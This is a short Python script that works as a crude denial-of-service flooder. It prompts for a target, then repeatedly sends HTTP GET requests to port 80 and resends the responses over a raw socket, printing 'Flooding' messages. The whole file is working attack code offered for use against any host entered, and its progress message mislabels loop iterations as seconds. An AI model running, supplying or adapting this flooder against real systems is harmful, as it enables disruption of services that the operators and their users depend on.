#!/bin/python3

import socket
import random
import requests

useragent = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}

def flood(target):
    req = requests.get(f"http://{target}:80/", headers=useragent)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, 80))
    sock.sendto(req.content, (target, 80))
    sock.close()

target = input("[!] target? ")
for _ in range(1,10000):
    flood(target) # calling the function/starting flood in for loop
    print(f"[+] Flooding {target} on port 80 for {_} seconds")
